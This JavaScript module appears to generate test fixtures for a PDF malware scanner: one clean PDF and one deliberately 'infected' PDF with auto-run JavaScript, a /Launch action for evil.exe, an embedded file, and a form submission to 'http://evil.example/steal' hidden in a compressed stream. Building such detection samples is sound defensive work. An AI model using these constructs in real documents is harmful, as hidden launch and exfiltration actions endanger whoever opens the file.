import pako from 'pako';

function strToBytes(s) {
  const out = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i) & 0xff;
  return out;
}

function concatBytes(arrays) {
  const total = arrays.reduce((n, a) => n + a.length, 0);
  const out = new Uint8Array(total);
  let off = 0;
  for (const a of arrays) { out.set(a, off); off += a.length; }
  return out;
}

// A deliberately "infected" PDF used to demonstrate the scanner.
// It is NOT a working exploit — it simply contains the dangerous PDF
// features (JavaScript, /Launch, an embedded file, and a payload hidden in a
// compressed stream) so the scanner has something real to catch.
export function makeMaliciousPdf() {
  const hidden = '<< /S /JavaScript /JS (app.exec("calc")) /F (evil.exe) /S /Launch /SubmitForm << /F (http://evil.example/steal) >> >>';
  const compressed = pako.deflate(hidden);

  const parts = [];
  parts.push(strToBytes('%PDF-1.7\n'));
  parts.push(strToBytes('1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R /Names 4 0 R >>\nendobj\n'));
  parts.push(strToBytes('2 0 obj\n<< /Type /Pages /Kids [5 0 R] /Count 1 >>\nendobj\n'));
  parts.push(strToBytes('3 0 obj\n<< /S /JavaScript /JS (app.alert("hello")) >>\nendobj\n'));
  parts.push(strToBytes('4 0 obj\n<< /Names << /JavaScript << /Names [(a) 6 0 R] >> >>\nendobj\n'));
  parts.push(strToBytes('5 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 7 0 R /Annots [8 0 R] >>\nendobj\n'));
  parts.push(strToBytes('6 0 obj\n<< /Type /Action /S /JavaScript /JS (app.launchURL("http://evil.example")) >>\nendobj\n'));
  parts.push(strToBytes('7 0 obj\n<< /Length ' + compressed.length + ' /Filter /FlateDecode >>\nstream\n'));
  parts.push(compressed);
  parts.push(strToBytes('\nendstream\nendobj\n'));
  parts.push(strToBytes('8 0 obj\n<< /Type /Annot /Subtype /Launch /A << /S /Launch /F (evil.exe) >> /EF << /F << /Type /Filespec /F (evil.exe) /EF << /F 9 0 R >> >> >> >>\nendobj\n'));
  parts.push(strToBytes('9 0 obj\n<< /Type /EmbeddedFile /Subtype /application/octet-stream /Length 4 >>\nstream\nAAAA\nendstream\nendobj\n'));
  parts.push(strToBytes('trailer\n<< /Size 10 /Root 1 0 R >>\n%%EOF\n'));

  return concatBytes(parts);
}

// A plain, harmless PDF with no dangerous features.
export function makeCleanPdf() {
  const parts = [];
  parts.push(strToBytes('%PDF-1.7\n'));
  parts.push(strToBytes('1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'));
  parts.push(strToBytes('2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'));
  parts.push(strToBytes('3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n'));
  parts.push(strToBytes('4 0 obj\n<< /Length 40 >>\nstream\nBT /F1 24 Tf 72 720 Td (Hello) Tj ET\nendstream\nendobj\n'));
  parts.push(strToBytes('trailer\n<< /Size 5 /Root 1 0 R >>\n%%EOF\n'));
  return concatBytes(parts);
}